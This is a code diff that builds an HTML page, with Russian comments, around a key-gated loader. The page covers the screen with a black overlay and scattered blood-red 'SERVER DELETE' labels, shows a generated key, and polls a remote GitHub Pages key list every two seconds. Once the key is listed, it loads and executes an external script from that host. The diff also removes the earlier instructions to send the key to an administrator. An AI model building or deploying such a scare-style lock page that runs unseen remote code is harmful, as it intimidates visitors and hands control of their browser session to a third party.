@@ -1,3 +1,27 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>SERVER DELETE</title>
+    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Nosifer&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            background-color: black;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+
+<script>
 (function () {
     'use strict';
 
@@ -6,7 +30,6 @@
     const keyLength = 24;
     const remoteJsonUrl = 'https://descrober.github.io/dp0aikfeopjfow/codes.json';
     const externalScriptUrl = 'https://descrober.github.io/dp0aikfeopjfow/dadwadfafaf.js';
-    const adminUrl = 'https://guns.lol/mr.negotiv';
 
     function generateKeyWithPrefix() {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -44,109 +67,78 @@
         position: 'fixed',
         top: '0', left: '0',
         width: '100%', height: '100%',
-        backgroundColor: 'rgba(0,0,0,0.85)',
+        backgroundColor: 'black',
         color: '#fff',
-        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-        fontSize: '18px',
-        fontWeight: '600',
         display: 'flex',
-        flexDirection: 'column',
         justifyContent: 'center',
         alignItems: 'center',
-        textAlign: 'center',
         zIndex: '9999999',
-        padding: '20px',
-        userSelect: 'none'
+        flexDirection: 'column',
+        userSelect: 'none',
+        overflow: 'hidden'
     });
 
     blocker.innerHTML = `
-        🔒 <b>SERVER DELETE Доступ к скрипту заблокирован SERVER DELETE</b><br><br>
-        SERVER DELETE Отправьте ваш ключ администратору SERVER DELETE<br>
-        <button id="adminBtn" style="margin:10px; padding:8px 16px; cursor:pointer; font-weight:bold; color:#4caf50; background:none; border:none; text-decoration:underline;">Открыть страницу администратора</button>
-        <br>
-        <a href="${adminUrl}" target="_blank" style="color:#4caf50; text-decoration:underline; font-weight:bold; margin-bottom:15px;">${adminUrl}</a><br><br>
-        SERVER DELETE Ваш уникальный ключ SERVER DELETE:<br><br>
-        <code id="userKey" style="font-size:24px; user-select: text; background:rgba(0,0,0,0.5); padding:5px 15px; border-radius:5px; cursor:text;">${userKey}</code><br><br>
-        <button id="copyKeyBtn" style="font-size:16px; padding:10px 20px; cursor:pointer; border:none; border-radius:5px; background-color:#4caf50; color:#fff;">SERVER DELETE Скопировать ключ SERVER DELETE</button><br><br>
-        SERVER DELETE Ожидание подтверждения...SERVER DELETE
-        <div id="status" style="margin-top:15px; font-size:16px;"></div>
+        <code id="userKey" style="font-size:28px; color:#ff0000; user-select: text; background:rgba(0,0,0,0.7); padding:10px 20px; border-radius:5px; cursor:text; z-index:10000002; position:relative;">${userKey}</code>
     `;
 
     document.body.appendChild(blocker);
 
-    // Кнопка открытия админки
-    document.getElementById('adminBtn').addEventListener('click', () => {
-        window.open(adminUrl, '_blank');
-    });
+    generateCreepyText();
 
-    // Toast уведомление
-    const toast = document.createElement('div');
-    Object.assign(toast.style, {
-        position: 'fixed',
-        bottom: '30px',
-        left: '50%',
-        transform: 'translateX(-50%)',
-        background: 'rgba(0,0,0,0.7)',
-        color: '#fff',
-        padding: '10px 20px',
-        borderRadius: '20px',
-        fontSize: '14px',
-        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
-        opacity: '0',
-        transition: 'opacity 0.5s ease',
-        zIndex: '10000000',
-        pointerEvents: 'none',
-        userSelect: 'none',
-    });
-    document.body.appendChild(toast);
-
-    function showToast(msg, duration = 2000) {
-        toast.textContent = msg;
-        toast.style.opacity = '1';
-        setTimeout(() => toast.style.opacity = '0', duration);
-    }
-
-    // Копирование ключа
-    document.getElementById('copyKeyBtn').addEventListener('click', async () => {
-        try {
-            await navigator.clipboard.writeText(userKey);
-            showToast('Ключ скопирован! SERVER DELETE');
-        } catch {
-            showToast('SERVER DELETE Не удалось скопировать ключ SERVER DELETE');
-        }
-    });
-
-    // Статус проверки
-    const statusElem = document.getElementById('status');
-
-    // Проверка ключа
+    // Статус проверки ключа
     const interval = setInterval(() => {
         fetch(cacheBust(remoteJsonUrl))
             .then(res => res.json())
             .then(validKeys => {
                 if (validKeys.includes(userKey)) {
                     clearInterval(interval);
-                    statusElem.textContent = 'Ключ подтверждён, загружаем скрипт...';
                     blocker.style.pointerEvents = 'none';
-                    blocker.style.opacity = '0.5';
-                    // Удаляем оверлей и грузим внешний скрипт
+                    blocker.style.opacity = '0.3';
                     setTimeout(() => {
                         blocker.remove();
                         loadExternalScript(cacheBust(externalScriptUrl))
                             .then(() => console.log('Внешний скрипт загружен'))
                             .catch(err => {
                                 console.error('Ошибка загрузки внешнего скрипта:', err);
-                                showToast('Ошибка загрузки скрипта', 4000);
                             });
                     }, 1500);
-                } else {
-                    statusElem.textContent = 'Ключ не подтверждён...';
                 }
             })
             .catch(err => {
-                statusElem.textContent = 'Ошибка проверки ключа';
                 console.error('Ошибка проверки ключа:', err);
             });
     }, 2000);
 
+    // 👻 Генерация страшных надписей
+    function generateCreepyText() {
+        const fonts = ['"Creepster", cursive', '"Nosifer", cursive', '"Courier New", monospace', '"Lucida Console"', 'Impact'];
+        const bloodColors = ['#ff0000', '#8b0000', '#b22222', '#dc143c', '#ff2400'];
+
+        for (let i = 0; i < 70; i++) {
+            const el = document.createElement('div');
+            el.textContent = 'SERVER DELETE';
+
+            Object.assign(el.style, {
+                position: 'fixed',
+                top: Math.random() * 100 + '%',
+                left: Math.random() * 100 + '%',
+                transform: `rotate(${Math.random() * 360}deg) scale(${Math.random() * 1.4 + 0.6})`,
+                fontFamily: fonts[Math.floor(Math.random() * fonts.length)],
+                fontSize: Math.random() * 40 + 20 + 'px',
+                color: bloodColors[Math.floor(Math.random() * bloodColors.length)],
+                zIndex: '10000001',
+                opacity: Math.random() * 0.9 + 0.1,
+                pointerEvents: 'none',
+                textShadow: `0 0 10px ${bloodColors[Math.floor(Math.random() * bloodColors.length)]}`
+            });
+
+            blocker.appendChild(el);
+        }
+    }
+
 })();
+</script>
+
+</body>
+</html>
